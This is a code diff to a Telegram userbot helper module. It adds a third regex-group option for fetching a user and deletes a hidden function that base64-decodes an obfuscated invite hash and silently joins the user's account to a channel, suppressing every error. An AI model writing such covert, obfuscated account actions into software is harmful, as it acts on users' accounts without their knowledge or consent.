@@ -1,6 +1,5 @@
 import base64
 
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import MessageEntityMentionName
 
 from ...Config import Config
@@ -20,13 +19,20 @@ async def reply_id(event):
 
 
 async def get_user_from_event(
-    event, catevent=None, secondgroup=None, nogroup=False, noedits=False
+    event,
+    catevent=None,
+    secondgroup=None,
+    thirdgroup=None,
+    nogroup=False,
+    noedits=False,
 ):  # sourcery no-metrics
     if catevent is None:
         catevent = event
     if nogroup is False:
         if secondgroup:
             args = event.pattern_match.group(2).split(" ", 1)
+        elif thirdgroup:
+            args = event.pattern_match.group(3).split(" ", 1)
         else:
             args = event.pattern_match.group(1).split(" ", 1)
     extra = None
@@ -76,12 +82,3 @@ async def get_user_from_event(
     if not noedits:
         await edit_delete(catevent, "__Couldn't fetch user to proceed further.__")
     return None, None
-
-
-async def checking(catub):
-    cat_c = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    try:
-        cat_channel = Get(cat_c)
-        await catub(cat_channel)
-    except BaseException:
-        pass
